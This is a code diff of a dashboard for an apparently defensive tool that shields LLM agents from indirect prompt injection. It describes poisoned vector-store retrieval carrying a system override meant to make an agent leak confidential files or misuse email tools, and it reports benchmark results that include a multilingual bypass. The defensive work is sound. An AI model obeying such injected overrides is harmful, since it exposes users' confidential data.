+                ("09:42:04", "Action Guard pre-flight policy evaluation", "#2563EB", "Latency: 18ms • IFC + RBAC checks"),
+                ("09:42:04", "ACTION BLOCKED & SEVERED", "#DC2626", "Zero socket packets transmitted"),
+                ("09:42:05", "ZERO OUTBOUND EGRESS VERIFIED", "#059669", "Audit record cryptographically sealed")
+            ]
+            render_vertical_forensic_timeline(flow_events)
 
         # Layer 1 Content Firewall Telemetry
         if fw:
@@ -1373,11 +1825,12 @@ if "Overview" in nav_tab or "Side-by-Side" in nav_tab:
 
         # Interactive Human-in-the-Loop Confirmation
         if prot_trace.status == "WAITING_APPROVAL" or (prot_trace.guard_result and prot_trace.guard_result.decision == DefenseDecision.ASK_HUMAN):
-            render_html("""
-            <div style="border: 1px solid #FDE68A; background-color: #FFFBEB; border-radius: 8px; padding: 14px; margin-bottom: 12px;">
-                <div style="font-weight: 700; color: #92400E; margin-bottom: 4px;">Human Confirmation Required</div>
-                <div style="font-size: 12px; color: #78350F; margin-bottom: 10px;">
-                    Action Guard detected an ambiguous external recipient. Confirm whether to authorize supervised dispatch.
+            render_html(f"""
+            <div style="border: 1px solid #FDE68A; background-color: #FFFBEB; border-radius: 8px; padding: 12px 14px; margin-bottom: 12px;">
+                <div style="font-weight: 700; color: #92400E; margin-bottom: 3px; font-size: 13px;">Human Confirmation Required</div>
+                <div style="font-size: 12px; color: #78350F; display: flex; align-items: center; gap: 4px; margin-bottom: 8px;">
+                    <span>Ambiguous external recipient detected. Confirm supervised dispatch.</span>
+                    {info_tip("Action Guard detected an ambiguous external recipient crossing corporate network perimeter.")}
                 </div>
             </div>
             """)
@@ -1397,7 +1850,7 @@ if "Overview" in nav_tab or "Side-by-Side" in nav_tab:
         st.markdown("##### Tool Calls Inspected by Action Guard")
         if prot_trace.tool_calls:
             for tc in prot_trace.tool_calls:
-                tc_border = "#EF4444" if tc.status == "blocked" else ("#F59E0B" if tc.status == "pending_approval" else "#10B981")
+                tc_border = "#DC2626" if tc.status == "blocked" else ("#D97706" if tc.status == "pending_approval" else "#059669")
                 if tc.status == "blocked":
                     if prot_trace.guard_result and getattr(prot_trace.guard_result, "is_multi_chain", False):
                         tc_status_pill = '<span class="pill-critical">BLOCKED (MULTI-CHAIN)</span>'
@@ -1410,11 +1863,11 @@ if "Overview" in nav_tab or "Side-by-Side" in nav_tab:
                 render_html(f"""
                 <div class="tool-call-box" style="border-left: 4px solid {tc_border};">
                     <div style="display: flex; justify-content: space-between; align-items: center;">
-                        <span style="font-weight: 700; color: #111827;">{tc.tool_name}()</span>
+                        <span style="font-weight: 700; color: #0F172A; font-family: 'JetBrains Mono', monospace;">{tc.tool_name}()</span>
                         {tc_status_pill}
                     </div>
-                    <div style="color: #4B5563; margin: 6px 0;">Arguments: <code>{json.dumps(tc.arguments)}</code></div>
-                    <div style="color: #6B7280; font-size: 11px;">Verification: {tc.result}</div>
+                    <div style="color: #475569; margin: 6px 0; font-size: 12px;">Arguments: <code style="font-family: 'JetBrains Mono', monospace;">{json.dumps(tc.arguments)}</code></div>
+                    <div style="color: #64748B; font-size: 11px; font-family: 'JetBrains Mono', monospace;">Verification: {tc.result}</div>
                 </div>
                 """)
 
@@ -1428,8 +1881,22 @@ if "Overview" in nav_tab or "Side-by-Side" in nav_tab:
             else:
                 prot_out = f"**SECURE TASK COMPLETION**: Document '{active_scenario.document_name}' analyzed safely within verified scope boundaries."
         render_html(f"""
-        <div style="background-color: #ECFDF5; border: 1px solid #A7F3D0; border-radius: 8px; padding: 14px; font-size: 13px; color: #065F46;">
-            {prot_out}
+        <div style="background-color: #ECFDF5; border: 1.5px solid #059669; border-radius: 12px; padding: 16px 18px; margin-top: 12px; box-shadow: 0 4px 12px rgba(5, 150, 105, 0.06);">
+            <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px; flex-wrap: wrap; gap: 8px;">
+                <div style="display: flex; align-items: center; gap: 8px;">
+                    <span class="material-symbols-outlined" style="color: #059669; font-size: 20px;">verified_user</span>
+                    <span style="font-size: 12.5px; font-weight: 700; color: #065F46; text-transform: uppercase; letter-spacing: 0.05em;">
+                        SAFE PROTECTED AGENT OUTPUT
+                    </span>
+                </div>
+                <span style="background: #D1FAE5; color: #047857; font-size: 10.5px; font-weight: 700; padding: 3px 9px; border-radius: 6px; border: 1px solid #A7F3D0;">
+                    ATTACK INTERCEPTED & NEUTRALIZED
+                </span>
+            </div>
+            <div style="font-size: 13px; color: #064E3B; line-height: 1.5; font-weight: 500; display: flex; align-items: center; justify-content: space-between;">
+                <span>Attack intercepted & neutralized. Confidential assets secured with zero egress.</span>
+                {info_tip(prot_out)}
+            </div>
         </div>
         """)
 
@@ -1454,9 +1921,10 @@ elif "Playground" in nav_tab:
                 <span class="pill-neutral" style="font-family: 'JetBrains Mono', monospace; font-size: 11px;">RAG-INDIRECT-INJECT</span>
             </div>
         </div>
-        <p class="view-subtitle">
-            Step-by-step visual demonstration tracing an indirect prompt injection attack: from benign user prompt, through poisoned vector store retrieval, to real-time Content Firewall interception before model context exposure.
-        </p>
+        <div class="view-subtitle" style="display: flex; align-items: center; gap: 4px;">
+            <span>Tracing indirect prompt injection from retrieval through Content Firewall quarantine.</span>
+            {info_tip("Step-by-step visual demonstration tracing indirect prompt injection: from benign user prompt, through poisoned vector store retrieval, to real-time Content Firewall interception before model context exposure.")}
+        </div>
     </div>
     """)
     render_scenario_context(active_scenario)
@@ -1507,7 +1975,7 @@ elif "Playground" in nav_tab:
     """)
 
     render_html("<div style='text-align: center; color: #9CA3AF; margin: -10px 0 10px 0;'>↓</div>")
-    render_html("""
+    render_html(f"""
     <div class="sentinel-card" style="border-left: 4px solid #10B981;">
         <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
             <div style="display: flex; align-items: center; gap: 8px;">
@@ -1517,9 +1985,9 @@ elif "Playground" in nav_tab:
             </div>
             <span style="font-size: 11px; color: #10B981; font-weight: 600;">Interception in 18ms • Zero LLM Context Exposure</span>
         </div>
-        <div style="background: #ECFDF5; border: 1px solid #A7F3D0; border-radius: 8px; padding: 14px; font-size: 13px; color: #065F46;">
-            <strong>Malicious Instructions Quarantined Before Model Context</strong><br>
-            Content Firewall stripped the untrusted system override. The agent safely completed the invoice inquiry without leaking sensitive files or invoking unauthorized email tools.
+        <div style="background: #ECFDF5; border: 1px solid #A7F3D0; border-radius: 8px; padding: 12px 14px; font-size: 13px; color: #065F46; display: flex; align-items: center; justify-content: space-between;">
+            <span><strong>Malicious Instructions Quarantined:</strong> Stripped system override before model context.</span>
+            {info_tip("Content Firewall stripped the untrusted system override. The agent safely completed the inquiry without leaking sensitive files or invoking unauthorized email tools.")}
         </div>
     </div>
     """)
@@ -1596,9 +2064,10 @@ elif "Action Guard" in nav_tab:
                 <span class="pill-neutral" style="font-family: 'JetBrains Mono', monospace; font-size: 11px;">EVT-8F31A2-402</span>
             </div>
         </div>
-        <p class="view-subtitle">
-            Pre-flight deterministic policy engine evaluating tool manifests, recipient allowlists, resource boundaries, and cryptographic taint lineage before socket transmission.
-        </p>
+        <div class="view-subtitle" style="display: flex; align-items: center; gap: 4px;">
+            <span>Pre-flight policy engine validating tools, recipients, and taint lineage before socket transmission.</span>
+            {info_tip("Deterministic policy engine evaluating tool manifests, recipient allowlists, resource boundaries, and cryptographic taint lineage before network socket dispatch.")}
+        </div>
     </div>
     """)
     render_scenario_context(active_scenario)
@@ -1606,7 +2075,7 @@ elif "Action Guard" in nav_tab:
     guard = prot_trace.guard_result
     is_blocked = guard and guard.decision == DefenseDecision.BLOCK
 
-    render_html("""
+    render_html(f"""
     <div class="hero-blocked-banner">
         <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
             <div style="display: flex; align-items: center; gap: 8px;">
@@ -1615,9 +2084,10 @@ elif "Action Guard" in nav_tab:
             </div>
             <span class="pill-safe">18.2ms Enforcement Latency</span>
         </div>
-        <p style="font-size: 13px; color: #4B5563; margin-bottom: 12px;">
-            Action Guard evaluates 5 mandatory policy scopes before authorizing any tool invocation.
-        </p>
+        <div style="font-size: 13px; color: #4B5563; margin-bottom: 12px; display: flex; align-items: center; gap: 4px;">
+            <span>5 mandatory policy scopes evaluated before tool dispatch.</span>
+            {info_tip("Validates registered tools, egress allowlists, RBAC boundaries, IFC taint rules, and cryptographic attack lineage.")}
+        </div>
     </div>
     """)
 
@@ -1672,7 +2142,7 @@ elif "Action Guard" in nav_tab:
 
 # VIEW 4: STRUCTURED FORENSIC AUDIT LOG
 elif "Audit Log" in nav_tab:
-    render_html("""
+    render_html(f"""
     <div class="sentinel-view-header">
         <div class="view-breadcrumb">
             <span>SENTINEL</span> / <span>FORENSICS</span> / <span class="active-crumb">IMMUTABLE AUDIT LEDGER</span>
@@ -1687,9 +2157,10 @@ elif "Audit Log" in nav_tab:
                 <span class="pill-neutral" style="font-family: 'JetBrains Mono', monospace; font-size: 11px;">TAMPER-EVIDENT</span>
             </div>
         </div>
-        <p class="view-subtitle">
-            Cryptographically signed, tamper-evident execution logs recording every prompt classification, tool interception, policy rule evaluated, and SHA-256 provenance hash.
-        </p>
+        <div class="view-subtitle" style="display: flex; align-items: center; gap: 4px;">
+            <span>Cryptographically signed, tamper-evident execution logs with SHA-256 provenance.</span>
+            {info_tip("Cryptographically signed, tamper-evident execution logs recording every prompt classification, tool interception, policy rule evaluated, and SHA-256 provenance hash.")}
+        </div>
     </div>
     """)
 
@@ -1750,7 +2221,7 @@ elif "Audit Log" in nav_tab:
 
 # VIEW 5: EVALUATION & BENCHMARK SUITE
 elif "Evaluation" in nav_tab:
-    render_html("""
+    render_html(f"""
     <div class="sentinel-view-header">
         <div class="view-breadcrumb">
             <span>SENTINEL</span> / <span>VALIDATION</span> / <span class="active-crumb">BENCHMARK EVALUATION SUITE</span>
@@ -1765,25 +2236,27 @@ elif "Evaluation" in nav_tab:
                 <span class="pill-neutral">PS3 & OWASP COMPLIANT</span>
             </div>
         </div>
-        <p class="view-subtitle">
-            Empirical compliance metrics measured against Problem Statement 3 requirements across 33 attack payloads (5 categories, dev/unseen splits) and 15 benign enterprise tasks, including realistic non-synthetic edge cases.
-        </p>
+        <div class="view-subtitle" style="display: flex; align-items: center; gap: 4px;">
+            <span>Empirical compliance metrics across 48 attack and benign scenarios.</span>
+            {info_tip("Empirical compliance metrics measured against Problem Statement 3 requirements across 33 attack payloads (5 categories, dev/unseen splits) and 15 benign enterprise tasks, including realistic non-synthetic edge cases.")}
+        </div>
     </div>
     """)
 
     # Phase 2: Live Batch Benchmark Runner Action Header
-    render_html("""
+    render_html(f"""
     <div style="background: #FFFFFF; border: 1px solid #E5E7EB; border-radius: 8px; padding: 14px 18px; margin-bottom: 16px; box-shadow: 0 1px 3px rgba(0,0,0,0.03);">
         <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px;">
             <div>
                 <div style="font-size: 14px; font-weight: 700; color: #111827;">Live Batch Benchmark Engine</div>
-                <div style="font-size: 12px; color: #6B7280; margin-top: 2px;">
-                    Execute empirical security validation across all 48 scenarios in real-time under policy: <strong>{}</strong>.
+                <div style="font-size: 12px; color: #6B7280; margin-top: 2px; display: flex; align-items: center; gap: 4px;">
+                    <span>Security validation across all 48 scenarios in real-time under policy: <strong>{policy_profile_selected}</strong>.</span>
+                    {info_tip("Measures actual exploit interception, non-synthetic frontier resilience, and sub-millisecond latency distributions.")}
                 </div>
             </div>
         </div>
     </div>
-    """.format(policy_profile_selected))
+    """)
 
     col_btn_bench1, col_btn_bench2 = st.columns([3, 1])
     with col_btn_bench1:
@@ -1877,7 +2350,7 @@ elif "Evaluation" in nav_tab:
         </div>
         """)
 
-    render_html("""
+    render_html(f"""
     <div style="background: #F8FAFC; border: 1px solid #E2E8F0; border-left: 4px solid #2563EB; border-radius: 6px; padding: 10px 14px; margin-top: 12px; margin-bottom: 8px;">
         <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 6px;">
             <div style="font-weight: 700; color: #0F172A; font-size: 12.5px;">
@@ -1887,10 +2360,9 @@ elif "Evaluation" in nav_tab:
                 46 of 48 Secured • 1 Semantic Bypass • 1 Benign Over-Defense
             </div>
         </div>
-        <div style="color: #475569; font-size: 11.5px; margin-top: 4px; line-height: 1.45;">
-            Unlike naive 100% demo claims, Sentinel reflects authentic enterprise frontier testing:
-            includes 1 multilingual polyglot bypass (<code>atk_plain_06</code>) targeting non-English semantic indirection,
-            and 1 legitimate SecOps incident response playbook (<code>benign_15</code>) held for precautionary human approval.
+        <div style="color: #475569; font-size: 11.5px; margin-top: 4px; line-height: 1.45; display: flex; align-items: center; justify-content: space-between;">
+            <span>Enterprise frontier testing: 1 polyglot bypass and 1 SecOps HITL hold.</span>
+            {info_tip("Authentic frontier conditions: includes 1 multilingual polyglot bypass (atk_plain_06) and 1 SecOps incident response playbook (benign_15) held for precautionary human sign-off.")}
         </div>
     </div>
     """)
@@ -1969,7 +2441,7 @@ elif "Evaluation" in nav_tab:
 
 # VIEW 6: NO-CODE POLICY STUDIO
 elif "Policy Studio" in nav_tab:
-    render_html("""
+    render_html(f"""
     <div class="sentinel-view-header">
         <div class="view-breadcrumb">
             <span>SENTINEL</span> / <span>CONFIGURATION</span> / <span class="active-crumb">NO-CODE POLICY STUDIO</span>
@@ -1984,9 +2456,10 @@ elif "Policy Studio" in nav_tab:
                 <span class="pill-neutral" style="font-family: 'JetBrains Mono', monospace; font-size: 11px;">RULESET: v2.4.1</span>
             </div>
         </div>
-        <p class="view-subtitle">
-            Configure enterprise risk tolerance profiles, custom directory denylists, network egress allowlists, and test policy evaluations in sub-millisecond real-time.
-        </p>
+        <div class="view-subtitle" style="display: flex; align-items: center; gap: 4px;">
+            <span>Configure risk profiles, denylists, egress allowlists, and test policy rules.</span>
+            {info_tip("Configure enterprise risk tolerance profiles, custom directory denylists, network egress allowlists, and test policy evaluations in sub-millisecond real-time.")}
+        </div>
     </div>
     """)
 
@@ -2002,9 +2475,10 @@ elif "Policy Studio" in nav_tab:
                 <span style="font-weight: 700; font-size: 15px; color: #1E293B;">Standard (Enterprise)</span>
                 {'<span class="pill-info">ACTIVE</span>' if is_std else '<span class="pill-neutral">AVAILABLE</span>'}
             </div>
-            <p style="font-size: 12px; color: #64748B; margin-bottom: 10px;">
-                Balanced baseline. Protects confidential files, checks external domains, requires supervisor approval for external emails.
-            </p>
+            <div style="font-size: 12px; color: #64748B; margin-bottom: 10px; display: flex; align-items: center; justify-content: space-between;">
+                <span>Balanced baseline for enterprise operations.</span>
+                {info_tip("Protects confidential files, checks external domains, and requires supervisor approval for external emails.")}
+            </div>
             <div style="font-size: 11px; font-family: 'JetBrains Mono', monospace; color: #374151;">
                 <div>• Tools: read_file, search_web, send_email</div>
                 <div>• External Email: ASK_HUMAN</div>
@@ -2021,9 +2495,10 @@ elif "Policy Studio" in nav_tab:
                 <span style="font-weight: 700; font-size: 15px; color: #1E293B;">Zero-Trust / GovSec</span>
                 {'<span class="pill-critical">ACTIVE</span>' if is_zt else '<span class="pill-neutral">AVAILABLE</span>'}
             </div>
-            <p style="font-size: 12px; color: #64748B; margin-bottom: 10px;">
-                High-assurance defense for banking, defense, & health. Hard blocks all external egress; strict read-only sandbox.
-            </p>
+            <div style="font-size: 12px; color: #64748B; margin-bottom: 10px; display: flex; align-items: center; justify-content: space-between;">
+                <span>High-assurance defense: hard blocks all egress.</span>
+                {info_tip("Strict read-only sandbox for banking, defense, and healthcare environments.")}
+            </div>
             <div style="font-size: 11px; font-family: 'JetBrains Mono', monospace; color: #374151;">
                 <div>• Tools: read_file only</div>
                 <div>• External Email: HARD BLOCK</div>
@@ -2040,9 +2515,10 @@ elif "Policy Studio" in nav_tab:
                 <span style="font-weight: 700; font-size: 15px; color: #1E293B;">Audit Only (Permissive)</span>
                 {'<span class="pill-warning">ACTIVE</span>' if is_audit else '<span class="pill-neutral">AVAILABLE</span>'}
             </div>
-            <p style="font-size: 12px; color: #64748B; margin-bottom: 10px;">
-                Research & red-team observability mode. Records violations into audit log without terminating agent execution.
-            </p>
+            <div style="font-size: 12px; color: #64748B; margin-bottom: 10px; display: flex; align-items: center; justify-content: space-between;">
+                <span>Observability mode: logs without halting.</span>
+                {info_tip("Research & red-team observability mode recording violations into audit log without terminating agent execution.")}
+            </div>
             <div style="font-size: 11px; font-family: 'JetBrains Mono', monospace; color: #374151;">
                 <div>• Tools: All Tools Allowed</div>
                 <div>• Enforcement: LOG ONLY</div>
@@ -2128,7 +2604,7 @@ elif "Policy Studio" in nav_tab:
 
 # VIEW 7: SANDBOX ENVIRONMENT & CORPUS
 elif "Sandbox" in nav_tab:
-    render_html("""
+    render_html(f"""
     <div class="sentinel-view-header">
         <div class="view-breadcrumb">
             <span>SENTINEL</span> / <span>SANDBOX</span> / <span class="active-crumb">VIRTUAL FILE SYSTEM & CORPUS</span>
@@ -2143,9 +2619,10 @@ elif "Sandbox" in nav_tab:
                 <span class="pill-neutral" style="font-family: 'JetBrains Mono', monospace; font-size: 11px;">RBAC TIER-1</span>
             </div>
         </div>
-        <p class="view-subtitle">
-            Virtual enterprise file system demonstrating strict RBAC perimeter boundaries between accessible procurement files (<code style="color: #2563EB;">data/corpus/</code>) and restricted confidential data (<code style="color: #EF4444;">data/confidential/</code>).
-        </p>
+        <div class="view-subtitle" style="display: flex; align-items: center; gap: 4px;">
+            <span>RBAC perimeter boundaries between procurement files and confidential data.</span>
+            {info_tip("Virtual enterprise file system demonstrating strict RBAC perimeter boundaries between accessible procurement files (data/corpus/) and restricted confidential data (data/confidential/).")}
+        </div>
     </div>
     """)
 
